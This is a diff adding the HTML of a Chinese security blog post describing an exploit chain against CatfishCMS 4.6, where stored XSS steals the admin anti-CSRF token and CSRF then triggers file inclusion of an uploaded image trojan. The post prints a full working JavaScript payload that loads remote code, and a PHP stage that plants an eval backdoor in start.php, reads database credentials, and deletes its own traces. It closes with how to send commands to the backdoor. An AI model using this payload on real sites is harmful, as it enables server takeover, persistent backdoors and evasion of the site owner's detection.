@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="CatfishCMS 4.6.15 csrf getshell一、漏洞简介在测试的过程中发现更新版本的时候作者添加一个参数 verification可能是用来防治csrf。嗯，不得不说，作者安全意识提高了，用来防治csrf这的却是一个好思路，但是对于我们可以执行xss来说，verification就显的苍白无力了，因为我们可以先获取verification 然后在执行csrf 从而来绕过。 二、漏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/CatfishCMS/CatfishCMS%204.6.15%20csrf%20getshell/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="CatfishCMS 4.6.15 csrf getshell一、漏洞简介在测试的过程中发现更新版本的时候作者添加一个参数 verification可能是用来防治csrf。嗯，不得不说，作者安全意识提高了，用来防治csrf这的却是一个好思路，但是对于我们可以执行xss来说，verification就显的苍白无力了，因为我们可以先获取verification 然后在执行csrf 从而来绕过。 二、漏">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/CatfishCMS4.6.15csrfgetshell/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/CatfishCMS4.6.15csrfgetshell/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/CatfishCMS4.6.15csrfgetshell/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/CatfishCMS4.6.15csrfgetshell/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/CatfishCMS4.6.15csrfgetshell/media/rId29.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/CatfishCMS4.6.15csrfgetshell/media/rId30.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/CatfishCMS4.6.15csrfgetshell/media/rId32.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/CatfishCMS4.6.15csrfgetshell/media/rId33.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/CatfishCMS4.6.15csrfgetshell/media/rId34.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/CatfishCMS4.6.15csrfgetshell/media/rId35.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/CatfishCMS4.6.15csrfgetshell/media/rId36.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/CatfishCMS4.6.15csrfgetshell/media/rId37.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/CatfishCMS4.6.15csrfgetshell/media/rId38.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/CatfishCMS4.6.15csrfgetshell/media/rId39.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/CatfishCMS4.6.15csrfgetshell/media/rId40.png">
+<meta property="article:published_time" content="2022-07-08T06:25:53.589Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.675Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/CatfishCMS4.6.15csrfgetshell/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-CatfishCMS/CatfishCMS 4.6.15 csrf getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/CatfishCMS/CatfishCMS%204.6.15%20csrf%20getshell/" class="article-date">
+  <time datetime="2022-07-08T06:25:53.589Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CatfishCMS-4-6-15-csrf-getshell"><a href="#CatfishCMS-4-6-15-csrf-getshell" class="headerlink" title="CatfishCMS 4.6.15 csrf getshell"></a>CatfishCMS 4.6.15 csrf getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>在测试的过程中发现更新版本的时候作者添加一个参数 verification<br>可能是用来防治csrf。嗯，不得不说，作者安全意识提高了，用来防治csrf这的却是一个好思路，但是对于我们可以执行xss来说，verification<br>就显的苍白无力了，因为我们可以先获取verification 然后在执行csrf 从而来绕过。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>CatfishCMS 4.6</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>文件：CatfishCMS-4.6.12\catfish\library\think\Template.php</p>
+<p>函数：fetch()</p>
+<p><img src="/resource/CatfishCMS4.6.15csrfgetshell/media/rId25.png"></p>
+<p><img src="/resource/CatfishCMS4.6.15csrfgetshell/media/rId26.png"></p>
+<p><img src="/resource/CatfishCMS4.6.15csrfgetshell/media/rId27.png"></p>
+<p><img src="/resource/CatfishCMS4.6.15csrfgetshell/media/rId28.png"></p>
+<p><img src="/resource/CatfishCMS4.6.15csrfgetshell/media/rId29.png"></p>
+<p><img src="/resource/CatfishCMS4.6.15csrfgetshell/media/rId30.png"></p>
+<p>嗯，说完了。Fetch方法最后都会编译文件以后通过PHP输出，所以如果我们可以在他编译之前写入恶意代码 那么就可以为所欲为。</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>前台注册一个账户-&gt;注册一个图片马到网站中-&gt;评论处插入xss代码-&gt;等待无辜管理员登录网站-&gt;获取<br>verification(绕过检测)-&gt;管理员入口-页面管理-新建页面-csrf插入一条非法语句引起包含漏洞(用来包含前面的图片马)-&gt;包含漏洞执行代码-&gt;包含漏洞添加getshell_code.php文件写入恶意代码-&gt;包含漏洞-将框架文件start.php添加一句话木马-包含数据库配置文件-连接数据库-&gt;删除我们前面的评论-&gt;删除我们csrf创建的页面-&gt;邮件通知我们-&gt;getshell</p>
+<p>CatfishCMS-4.6.12-xss.js</p>
+<pre><code>/*  
+    需要插入的xss代码
+    &lt;img src=&quot;#&quot; alt=&quot;xss_csrf_getshll&quot; onerror=&quot;var url = &#39;http://127.0.0.1/cms/CatfishCMS-4.6.12/xss-js/CatfishCMS-4.6.12-xss.js&#39;;xss_js = &#39;&lt;scr&#39;+&#39;ipt src=&#39;+url+&#39;&gt;&lt;\/sc&#39;+&#39;ript&gt;&#39;;$(&#39;body&#39;).append(xss_js);&quot;&gt;
+*/ 
+
+//不用动的
+var articles = &#39;index.php/admin/Index/articles.html&#39;;//用来获取 verification 绕过检测
+var newpage = &#39;index.php/admin/Index/newpage.html&#39;;//生成文章地址
+var allpage = &#39;index.php/admin/Index/allpage.html&#39;;//获取文章链接
+
+//需要改的
+var url = &#39;http://0-sec.org&#39;;//你要日的站的域名
+var directory = &#39;/cms/CatfishCMS-4.6.12/&#39;; //日的站的额外目录一般为空即可(站点设置二级目录时，此目录要填写)
+var img_trojan_url = &#39;../../../&#39;+&#39;data/uploads/20171201/2c8b7c7f1d49faeb5321ce0c9b1962af.jpg&#39;;//图片马的地址 修改 + 号后面的即可
+var getshell_code = &#39;http://127.0.0.1/cms/CatfishCMS-4.6.12/xss-js/getshell_code.txt&#39;;//恶意代码远程包含的地址
+
+$(&#39;body&#39;).append(&#39;&lt;div id=&quot;csrf_verification&quot; style=&quot;display:none;&quot;&gt;&lt;/div&gt;&#39;);
+$(&#39;body&#39;).append(&#39;&lt;div id=&quot;csrf_allpage&quot; style=&quot;display:none;&quot;&gt;&lt;/div&gt;&#39;);
+
+$.ajax(&#123;
+    url: url+directory+articles,
+    dataType: &quot;json&quot;,
+    success: function(verification_content)&#123;
+        $(&#39;#csrf_verification&#39;).append(verification_content);
+        var verification = $(&#39;#verification&#39;).html();//用来绕过验证的
+        // alert(verification);
+
+        //csrf生成文章,引起文件包含漏洞
+        $.ajax(&#123;
+            type: &quot;POST&quot;,
+            url: url+directory+newpage,
+            data: &#123;
+                &#39;biaoti&#39;:&#39;xss_csrf_getshll&#39;,
+                &#39;template&#39;:img_trojan_url,
+                &#39;verification&#39;:verification,
+                &#39;fabushijian&#39;:&#39;2017-12-05 11:56:48&#39;
+            &#125;,
+            success: function()&#123;
+                //csrf获取shell链接
+                $.ajax(&#123;
+                    type: &quot;POST&quot;,
+                    url: url+directory+allpage,
+                    success: function(allpage_content)&#123;
+                        $(&#39;#csrf_allpage&#39;).append(allpage_content);
+                        var shell_id = $(&#39;#csrf_allpage .table-responsive .table-bordered tbody tr td .gouxuan&#39;).eq(0).val();
+                        var shell_url = $(&#39;#csrf_allpage .table-responsive .table-bordered tbody tr td a&#39;).eq(0).attr(&#39;href&#39;);
+
+                        var shell_content = &#39;&#39;;
+                            shell_content+= &quot;$myfile = fopen(&#39;getshell_code.php&#39;, &#39;w&#39;);&quot;;
+                            shell_content+= &#39;$txt = &#39;+&#39;file_get_contents(&quot;&#39;+getshell_code+&#39;&quot;);&#39;;
+                            shell_content+= &#39;fwrite($myfile, $txt);&#39;;
+                            console.log(shell_content);
+                        
+                        //执行shell 生成马子
+                        $.ajax(&#123;
+                            type: &quot;POST&quot;,
+                            url: url+shell_url,
+                            dataType: &quot;json&quot;,
+                            data: &#123;&#39;ddd&#39;:shell_content&#125;,
+                            success: function(data)&#123;
+                                $.ajax(&#123;
+                                    type: &quot;GET&quot;,
+                                    url: url+directory+&#39;getshell_code.php&#39;,
+                                    dataType: &quot;json&quot;, 
+                                    // data: &#123;&#39;zzz&#39;:1&#125;
+                                &#125;);
+                            &#125;,
+                            error: function()&#123;
+                                $.ajax(&#123;
+                                    type: &quot;GET&quot;,
+                                    url: url+directory+&#39;getshell_code.php&#39;,
+                                    dataType: &quot;json&quot;, 
+                                    // data: &#123;&#39;zzz&#39;:1&#125;
+                                &#125;);
+                            &#125;   
+                        &#125;);
+
+                    &#125; 
+                &#125;);
+
+            &#125; 
+        &#125;);
+
+    &#125;
+&#125;);
+</code></pre>
+<p><img src="/resource/CatfishCMS4.6.15csrfgetshell/media/rId32.png"></p>
+<p><img src="/resource/CatfishCMS4.6.15csrfgetshell/media/rId33.png"></p>
+<p>写好以后模拟管理员，进入后台</p>
+<p><img src="/resource/CatfishCMS4.6.15csrfgetshell/media/rId34.png"></p>
+<p><img src="/resource/CatfishCMS4.6.15csrfgetshell/media/rId35.png"></p>
+<p><img src="/resource/CatfishCMS4.6.15csrfgetshell/media/rId36.png"></p>
+<p><img src="/resource/CatfishCMS4.6.15csrfgetshell/media/rId37.png"></p>
+<p>getshell_code</p>
+<pre><code>&lt;?php  
+    $start_content = file_get_contents(&#39;catfish/start.php&#39;).&#39;eval(@$_POST[ddd]);&#39;;
+    $start = fopen(&#39;catfish/start.php&#39;, &#39;w&#39;);
+    fwrite($start, $start_content);
+    if( @$_GET[zzz])&#123;
+        $config = require_once(&quot;application/database.php&quot;);
+        //分别对应的是 地址，端口号，连接的数据库，编码
+        $dsn = &quot;mysql:host=&#123;$config[&#39;hostname&#39;]&#125;; port=&#123;$config[&#39;hostport&#39;]&#125;; dbname=&#123;$config[&#39;database&#39;]&#125;; charset=&#123;$config[&#39;charset&#39;]&#125;&quot;;
+        $user = $config[&#39;username&#39;];
+        $psw = $config[&#39;password&#39;];
+        $pdo = new PDO($dsn,$user,$psw);
+        $sql = &quot;DELETE from catfish_posts WHERE post_title LIKE &#39;%xss_csrf_getshll%&#39;&quot;;
+        $sql_1 = &quot;DELETE from catfish_comments WHERE content LIKE &#39;%xss_csrf_getshll%&#39;&quot;;
+        $pdo-&gt;query($sql);
+        $pdo-&gt;query($sql_1);
+        unlink(&#39;getshell_code.php&#39;);
+    &#125;
+?&gt;
+</code></pre>
+<p><img src="/resource/CatfishCMS4.6.15csrfgetshell/media/rId38.png"></p>
+<p>连接马子的操作，这个文件会在index.php中给引入所以直接</p>
+<pre><code>http://0-sec.org/index.php
+
+POST
+
+ddd = 你要执行的命令
+</code></pre>
+<p><img src="/resource/CatfishCMS4.6.15csrfgetshell/media/rId39.png"></p>
+<p><img src="/resource/CatfishCMS4.6.15csrfgetshell/media/rId40.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/CatfishCMS/CatfishCMS%204.6.15%20csrf%20getshell/" data-id="cl5c2qn3p003cy8v12rj9bt90" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/CatfishCMS/CatfishCMS%204.6.15%20%E5%89%8D%E5%8F%B0xss/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/CatfishCMS/CatfishCMS%204.5.7%20xss/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
